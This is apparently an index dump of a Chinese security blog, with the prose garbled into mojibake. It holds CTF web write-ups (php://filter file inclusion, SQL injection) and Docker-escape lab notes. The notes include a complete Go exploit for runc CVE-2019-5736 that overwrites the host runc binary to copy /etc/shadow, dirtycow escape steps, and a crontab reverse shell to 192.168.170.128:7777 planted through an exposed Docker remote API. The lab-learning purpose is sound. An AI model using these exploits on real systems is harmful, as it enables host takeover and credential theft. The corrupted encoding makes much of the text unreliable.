æ”¶è·ï¼šæ³¨å…¥çš„æ—¶å€™è¦å…ˆå°è¯•å¸¦å’Œä¸å¸¦'çš„è¾“å…¥ï¼Œåˆ¤æ–­æ˜¯æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚ ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x04-suctf-2019easysql"},{"categories":["CTF"],"content":"0x05 [ACTF2020 æ–°ç”Ÿèµ›]Include é¢˜ç›®é“¾æ¥ è¿™é¢˜å’Œä¸‹ä¸€é¢˜éƒ½æ˜¯æŒºæœ‰æ„æ€çš„é¢˜ï¼šï¼‰ é¦–å…ˆè¿›å…¥é¢˜ç›®ç»™å‡ºçš„åœ°å€ï¼Œçœ‹åˆ°ä¸€ä¸ªè¶…é“¾æ¥tipsï¼Œç‚¹å‡»ä¹‹åçœ‹åˆ°æç¤ºfile=flag.phpã€‚ä½†æ˜¯æˆ‘ä»¬åªèƒ½çœ‹åˆ°æç¤ºæ–‡å­—ï¼Œå¹¶ä¸èƒ½çœ‹åˆ°flagå†…å®¹ã€‚ image-20210301225314513image-20210301225314513 \" image-20210301225314513 è¿™ä¸ªæ—¶å€™å°±éœ€è¦çŸ¥é“æœ‰ä¸ªä¸œè¥¿å«åšphp filterï¼Œåˆ©ç”¨php://filterä¼ªåè®®ï¼Œæˆ‘ä»¬å¯ä»¥è·å–flag.phpæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ã€‚è®¿é—®/?file=php://filter/convert.base64-encode/resource=flag.phpã€‚ image-20210301225641520image-20210301225641520 \" image-20210301225641520 å°†å†…å®¹è¿›è¡Œbase64è§£ç ï¼Œäºæ˜¯å¾—åˆ°äº†è—åœ¨phpæ–‡ä»¶æ³¨é‡Šä¸­çš„flagã€‚ image-20210301225743179image-20210301225743179 \" image-20210301225743179 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:6:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x05-actf2020-æ–°ç”Ÿèµ›include"},{"categories":["CTF"],"content":"0x06 [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File é¢˜ç›®é“¾æ¥ è¿›å…¥ç½‘é¡µï¼Œå•¥ä¹Ÿæ²¡æœ‰ã€‚æ£€æŸ¥æºä»£ç ï¼Œå‘ç°äº†ä¸€ä¸ªéšè—çš„é“¾æ¥ã€‚ image-20210301230157746image-20210301230157746 \" image-20210301230157746 image-20210301230257773image-20210301230257773 \" image-20210301230257773 è®¿é—®/Archive_room.phpï¼Œå¾ˆæ˜æ˜¾èƒ½åšçš„åªæœ‰ç‚¹å‡»secreté“¾æ¥ã€‚ image-20210301230542428image-20210301230542428 \" image-20210301230542428 æŸ¥çœ‹secretå¯¹åº”çš„é“¾æ¥ï¼Œä¸º/action.phpï¼Œä½†æ˜¯ç‚¹å‡»ä¹‹åçš„ç»“æœå´æ˜¯/end.phpã€‚ image-20210301230805292image-20210301230805292 \" image-20210301230805292 äºæ˜¯ï¼Œéœ€è¦ç”¨åˆ°Burpsuiteï¼Œæ‹¦æˆªä¸€ä¸‹å¯¹action.phpçš„è®¿é—®ã€‚å‘ç°æç¤ºä¿¡æ¯secr3t.php image-20210301223830280image-20210301223830280 \" image-20210301223830280 å‘ç°secr3t.phpæä¾›äº†æ–‡ä»¶åŒ…å«æœåŠ¡ï¼Œå¹¶ä¸”æç¤ºä½ flagåœ¨flag.phpä¸­ã€‚ image-20210301230956851image-20210301230956851 \" image-20210301230956851 äº†è§£äº†ä¸Šä¸€é¢˜çš„å¥—è·¯ä¹‹åï¼Œåº”è¯¥å°±èƒ½æƒ³åˆ°ï¼Œç›´æ¥è·å–/secr3t.php?file=flag.phpï¼Œåº”è¯¥æ˜¯ä¸ä¼šç›´æ¥ç»™ä½ flagçš„ğŸ˜ã€‚ image-20210301231222300image-20210301231222300 \" image-20210301231222300 äºæ˜¯ï¼Œåˆæ˜¯å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„å¥—è·¯ï¼Œä½¿ç”¨filterï¼Œè·å–flag.phpå†…å®¹ï¼Œç„¶åå†è§£ç ã€‚ image-20210301231417059image-20210301231417059 \" image-20210301231417059 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:7:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x06-æå®¢å¤§æŒ‘æˆ˜-2019secret-file"},{"categories":["CTF"],"content":"0x07 [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL é¢˜ç›®é“¾æ¥ è¿˜æ˜¯ä¸å¤ªä¼šâ€¦ å‚è€ƒwpï¼š https://blog.csdn.net/SopRomeo/article/details/103979047 https://blog.csdn.net/xixihahawuwu/article/details/109999044?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control\u0026dist_request_id=af7328be-e424-4bcb-a3e6-e102be9d0ff9\u0026depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control åªèƒ½è®°å½•ä¸€ä¸‹è‡ªå·±æ¥è§¦äº†å•¥æ–°æ¦‚å¿µå§ æµ‹è¯•æ³¨å…¥ç±»å‹ ä½¿ç”¨1' order by x#ï¼Œæµ‹è¯•ä¸åŒxçš„å€¼ï¼Œæ ¹æ®ä»€ä¹ˆæ—¶å€™æŠ¥é”™æ¥ç¡®å®šè¡¨çš„åˆ—æ•° unionè”åˆæŸ¥è¯¢ ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:8:0","series":null,"tags":["CTF","web"],"title":"BUUCTF webè®°å½•","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x07-æå®¢å¤§æŒ‘æˆ˜-2019lovesql"},{"categories":["å®è·µè®°å½•"],"content":"kaliä¸Šæ¥æ”¶ä¸åˆ°åå¼¹shellï¼Œæ€ä¹ˆå›äº‹(successfully got write handle {address} è¿™é‡Œå¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥ï¼Œæ‰§è¡Œåˆ°è¿™é‡Œå¡ä½äº†ï¼Ÿ) package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n cat /etc/shadow \u003e /tmp/shadow \u0026\u0026 chmod 777 /tmp/shadow\" func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) \u003e 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it's executable flag for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) \u003e 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—4 runcæ¼æ´é€ƒé€¸","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#"},{"categories":["å®è·µè®°å½•"],"content":"åŸç†åˆ†æï¼š ä¿®æ”¹å®¹å™¨å†…çš„/bin/shæ–‡ä»¶ï¼Œæ”¹ä¸º#!/proc/self/exeï¼Œè¿™æ ·çš„è¯ï¼Œå½“å®¹å™¨å†…çš„/bin/shè¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå®é™…ä¸Šè¢«æ‰§è¡Œçš„æ–‡ä»¶è·¯å¾„æ˜¯/proc/self/exe /proc/self/exeæ˜¯å†…æ ¸ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ›å»ºçš„ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘ä¸ºè¯¥è¿›ç¨‹è€Œæ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚å½“å®¹å™¨ä¸­çš„/bin/shè¢«æ‰§è¡Œæ—¶ï¼Œ/proc/self/exeæŒ‡å‘çš„å®¿ä¸»æœºä¸Šçš„runcå°±ä¼šè¢«æ‰§è¡Œ ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:1","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—4 runcæ¼æ´é€ƒé€¸","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#åŸç†åˆ†æ"},{"categories":["å®è·µè®°å½•"],"content":"å‚è€ƒé“¾æ¥ å¤ç°å‚è€ƒ1 å¤ç°å‚è€ƒ2 PoCä»£ç åœ°å€ https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/#what-is-the-vulnerability ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:1:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—4 runcæ¼æ´é€ƒé€¸","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#å‚è€ƒé“¾æ¥"},{"categories":["å®è·µè®°å½•"],"content":" Dockeré€ƒé€¸3ï¼šåˆ©ç”¨Linuxå†…æ ¸æ¼æ´ dirtycow(CVE-2016-5195) è¿›è¡Œé€ƒé€¸ å®¿ä¸»æœºï¼šubuntu 14.04 Dockerç‰ˆæœ¬ï¼šDocker version 18.06.3-ce, build d7080c1 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:0:0","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#"},{"categories":["å®è·µè®°å½•"],"content":"æ­¥éª¤1ã€å®‰è£…è™šæ‹Ÿæœºä»¥åŠdockerä»¥åŠdocker-compose ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:0","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#æ­¥éª¤1å®‰è£…è™šæ‹Ÿæœºä»¥åŠdockerä»¥åŠdocker-compose"},{"categories":["å®è·µè®°å½•"],"content":"é•œåƒä¸‹è½½ï¼š http://old-releases.ubuntu.com/releases/14.04.3/ubuntu-14.04.5-desktop-amd64.iso.torrent ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:1","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#é•œåƒä¸‹è½½"},{"categories":["å®è·µè®°å½•"],"content":"dockerå®‰è£…ï¼š æŒ‰ç…§æ–‡æ¡£æ­¥éª¤æ“ä½œåˆ°æœ€åä¸€æ­¥ï¼Œå‘ç°docker-ce-cliæ‰¾ä¸åˆ°ã€‚ç»è¿‡åæ¥çš„å®é™…æ“ä½œç»“æœå¯çŸ¥ï¼Œå…¶å®å®‰è£…çš„åŒ…åªéœ€è¦å†™åˆ°docker-ceå°±å¯ä»¥äº†ã€‚ ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:2","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#dockerå®‰è£…"},{"categories":["å®è·µè®°å½•"],"content":"docker-composeå®‰è£…ï¼š https://blog.csdn.net/tianjiewang/article/details/83012635 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:3","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#docker-composeå®‰è£…"},{"categories":["å®è·µè®°å½•"],"content":"æ­¥éª¤2ã€å¯åŠ¨dirtyCowå®¹å™¨å¹¶æµ‹è¯•é€ƒé€¸ é¦–å…ˆå¤åˆ¶ä»“åº“**dirtycow-docker-vdso** git clone https://github.com/gebl/dirtycow-docker-vdso.git ç„¶åä½¿ç”¨docker-composeåˆ›å»ºå®¹å™¨ cd dirtycow-docker-vdso/ sudo docker-compose run dirtycow /bin/bash æŸ¥çœ‹å®¹å™¨ipåœ°å€ï¼Œæµ‹è¯•æ¼æ´ ifconfig cd /dirtycow-vdso/ make ./0xdeadbeef 172.18.0.3:1234 äºæ˜¯åœ¨å®¹å™¨é‡Œå°±å¯ä»¥çœ‹åˆ°é€ƒé€¸åˆ°äº†å®¿ä¸»æœºçš„ç¯å¢ƒï¼Œå¯ä»¥æ‰§è¡Œä¸€ç³»åˆ—æ“ä½œ ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:0","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#æ­¥éª¤2å¯åŠ¨dirtycowå®¹å™¨å¹¶æµ‹è¯•é€ƒé€¸"},{"categories":["å®è·µè®°å½•"],"content":"åŸç†åˆ†æ ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:0","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#åŸç†åˆ†æ"},{"categories":["å®è·µè®°å½•"],"content":"å‚è€ƒé“¾æ¥ï¼š https://thinkycx.me/2019-05-20-CVE-2016-5195-dirtycow-recurrence.html https://dirtycow.ninja/ https://blog.paranoidsoftware.com/dirty-cow-cve-2016-5195-docker-container-escape/ ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:4:0","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—3 dirtycowæ¼æ´åˆ©ç”¨","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#å‚è€ƒé“¾æ¥"},{"categories":["å®è·µè®°å½•"],"content":"nothing ","date":"2021-02-08","objectID":"/2021-02-08-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%972-docker-socket%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD/:0:0","series":null,"tags":["Linux kernel","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—2:docker.sockå±é™©æŒ‚è½½","uri":"/2021-02-08-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%972-docker-socket%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD/#"},{"categories":["å®è·µè®°å½•"],"content":" dockeré€ƒé€¸ç¬¬ä¸€ç§æ–¹å¼â€”â€”remote apiæœªæˆæƒè®¿é—® ç¯å¢ƒï¼š å®¿ä¸»æœºæ“ä½œç³»ç»Ÿï¼šUbuntu 20.04 LTS 192.168.170.129 æ‰§è¡Œæ”»å‡»çš„ä¸»æœºï¼šKaliï¼Œ5.9.0-kali1-amd64 192.168.170.128 dockerç‰ˆæœ¬ï¼šDocker version 20.10.2, build 2291f61 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:0:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#"},{"categories":["å®è·µè®°å½•"],"content":"æ­¥éª¤1ã€å¼€å¯docker remote api docker remote apiåº”è¯¥æ˜¯ä¸€ä¸ªæä¾›å›¾å½¢åŒ–ç•Œé¢æ¥ç®€åŒ–æ“ä½œçš„åŠŸèƒ½ï¼Œé€šè¿‡å°†å®¿ä¸»æœºçš„dockeræœåŠ¡é€šè¿‡socketçš„æ–¹å¼æš´éœ²ç»™å¤–éƒ¨è¿æ¥ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºä¹Ÿå¯ä»¥è®¿é—®dockeræœåŠ¡ã€‚ ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:1:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#æ­¥éª¤1å¼€å¯docker-remote-api"},{"categories":["å®è·µè®°å½•"],"content":"ä¿®æ”¹é…ç½®ï¼Œé‡å¯æœåŠ¡ lzy@zyUb:~$ sudo nano /lib/systemd/system/docker.service [sudo] password for lzy: lzy@zyUb:~$ sudo systemctl daemon-reload lzy@zyUb:~$ sudo service docker restart æ‰§è¡Œä¸Šè¿°å‘½ä»¤ï¼Œåœ¨docker.serviceæ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹çº¢çº¿æ‰€æ ‡å‡ºçš„å†…å®¹(-H tcp://0.0.0.0:2375) ä¿®æ”¹æ–‡ä»¶ä¿®æ”¹æ–‡ä»¶ \" ä¿®æ”¹æ–‡ä»¶ ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:1:1","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#ä¿®æ”¹é…ç½®é‡å¯æœåŠ¡"},{"categories":["å®è·µè®°å½•"],"content":"æŸ¥çœ‹æ•ˆæœ åœ¨å¦ä¸€å°è™šæ‹Ÿæœºä¸­æŸ¥çœ‹dockerå®¿ä¸»æœºçš„2375ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³ä¿¡æ¯ã€‚ remote-apiremote-api \" remote-api å¤–éƒ¨è®¿é—®å¤–éƒ¨è®¿é—® \" å¤–éƒ¨è®¿é—® ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:1:2","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#æŸ¥çœ‹æ•ˆæœ"},{"categories":["å®è·µè®°å½•"],"content":"æ­¥éª¤2ã€æ¼æ´æµ‹è¯• ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:2:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#æ­¥éª¤2æ¼æ´æµ‹è¯•"},{"categories":["å®è·µè®°å½•"],"content":"åˆ›å»ºå®¹å™¨ æŸ¥çœ‹dockerå®¿ä¸»æœºä¸Šå·²æœ‰çš„é•œåƒ â”Œâ”€â”€(lzyã‰¿kaliForZy)-[~] â””â”€$ docker -H tcp://192.168.170.129:2375 images REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest e50c909a8df2 9 days ago 5.61MB ubuntu 18.04 c090eaba6b94 2 weeks ago 63.3MB hello-world latest bf756fb1ae65 13 months ago 13.3kB ç„¶ååˆ›å»ºå®¹å™¨ã€‚å› ä¸ºæœ€ååå¼¹shellçš„å®ç°æ–¹å¼æ˜¯ä½¿ç”¨crontabè®¡åˆ’ä»»åŠ¡ï¼Œæ‰€ä»¥éœ€è¦å°†crontabç”¨åˆ°çš„æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯å®¿ä¸»æœºçš„var/spool/cronç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ â”Œâ”€â”€(lzyã‰¿kaliForZy)-[~] â””â”€$ docker -H tcp://192.168.170.129:2375 run -it -v /var/spool/cron/:/get3cad/ c090 /bin/bash ubuntuçš„crontabç›¸å…³æ–‡ä»¶çš„è·¯å¾„ä¸ºvar/spool/cron/crontabs/rootï¼Œä½†æ˜¯æˆ‘è‡ªå·±è£…çš„è™šæ‹Ÿæœºåœ¨è¯¥è·¯å¾„ä¸‹å¹¶ä¸å­˜åœ¨rootæ–‡ä»¶ã€‚æ‰€ä»¥åœ¨è¿›å…¥åˆ°å®¹å™¨ä¸­åï¼Œè¦åˆ‡æ¢åˆ°ç›¸åº”è·¯å¾„ï¼ˆä¹Ÿå¯ä»¥åœ¨åˆ›å»ºå®¹å™¨çš„æ—¶å€™å°±ä½¿ç”¨chrootå‚æ•°ï¼‰ï¼Œç„¶ååˆ›å»ºæ–‡ä»¶ã€‚ root@22b103440b66:/get3cad/crontabs# touch root éœ€è¦æ³¨æ„ï¼Œåˆ›å»ºçš„rootæ–‡ä»¶é»˜è®¤æ˜¯644æƒé™ï¼Œåœ¨crontabæ‰§è¡Œçš„æ—¶å€™ä¼šè¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨æ¨¡å¼ã€‚æ‰€ä»¥éœ€è¦ä¿®æ”¹æƒé™ä¸º600ã€‚ 644644 \" 644 securesecure \" secure root@22b103440b66:/get3cad/crontabs# chmod 600 root æœ€åå¾€rootæ–‡ä»¶ä¸­å†™å…¥åå¼¹shellçš„è®¡åˆ’ä»»åŠ¡ã€‚åŒæ—¶ï¼Œå› ä¸ºshä¸bashç¯å¢ƒçš„ä¸åŒï¼Œéœ€è¦å°†å‘½ä»¤ç”¨bash -cåŒ…å«èµ·æ¥ã€‚ root@22b103440b66:/get3cad/crontabs# echo '* * * * * bash -c \"bash -i \u003e\u0026/dev/tcp/192.168.170.128/7777 0\u003e\u00261\"' \u003e\u003e /get3cad/crontabs/root åœ¨æ”»å‡»è€…ä¸»æœºä¸­ä½¿ç”¨ncç›‘å¬ï¼Œè¿æ¥åˆ°åå¼¹çš„shell shellshell \" shell é™¤åå¼¹shellä¹‹å¤–ï¼Œåœ¨å®¿ä¸»æœºå¼€å¯äº†sshæœåŠ¡çš„æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ”¾å…¥æ”»å‡»è€…å…¬é’¥çš„æƒ…å†µä¸‹ï¼Œå®ç°sshè¿œç¨‹ç™»å½•ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°å’Œä¸Šè¿°crontabè®¡åˆ’ä»»åŠ¡åå¼¹shellç›¸åŒçš„æ•ˆæœã€‚ ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:2:1","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#åˆ›å»ºå®¹å™¨"},{"categories":["å®è·µè®°å½•"],"content":"å…¶ä»–æ”¶è· åˆå‘ç°äº†å‡ ä¸ªğŸ‚äººçš„åšå®¢ Linuxä¸­æ‰§è¡Œsudo -iåˆ‡æ¢åˆ°sudoæ¨¡å¼ï¼Œå°±èƒ½å¤Ÿcdåˆ°æƒé™ä¸å¤Ÿçš„è·¯å¾„ï¼Œè¿™ä¸ªç®—æ˜¯å›å¿†å§ å‘ç°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„dockeré•œåƒï¼šbusyboxï¼Œå°è€Œç²¾æ‚ï¼Œç‘å£«å†›åˆ€ èµ„æºç½‘ç«™ï¼šshodanï¼Œæœç´¢äº’è”ç½‘è®¾å¤‡ï¼Œæ‰€ä»¥ä¸è¦è½»æ˜“å°†è‡ªå·±çš„ç«¯å£æš´éœ²åœ¨å…¬ç½‘ã€‚çœ‹åˆ°è¿™ä¸ªç½‘ç«™æ˜¯å› ä¸ºæœ‰äººæ²¡æœ‰è‡ªå·±æ­ç¯å¢ƒå®ç°ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªç½‘ç«™æœç´¢ç°æœ‰çš„å¼€æ”¾äº†è¿œç¨‹apiçš„dockerç¯å¢ƒã€‚ä»è¿™äº›åšå®¢çš„å°è¯•ç»“æœæ¥çœ‹ï¼Œä¼¼ä¹å¾ˆå¤šæœ‰è¿™ä¸€æ¼æ´çš„dockerç¯å¢ƒï¼Œéƒ½è¢«åˆ«äººæ¤å…¥äº†æŒ–çŸ¿ç¨‹åºã€‚ å‰å‰ååèŠ±äº†4 5ä¸ªå°æ—¶ï¼Œè¸©å‘ä¹Ÿæ˜¯è¸©äº†è›®å¤šçš„ã€‚ç½‘ä¸Šçš„ç›¸å…³åšå®¢ä¹Ÿæœ‰å¾ˆå¤šï¼Œé™¤å»å†…å®¹é‡å¤çš„ä¸€äº›åï¼Œæˆ‘è§‰å¾—æ¯”è¾ƒæœ‰å‚è€ƒä»·å€¼çš„éƒ½æ”¾åœ¨ä¸‹é¢äº†ã€‚ 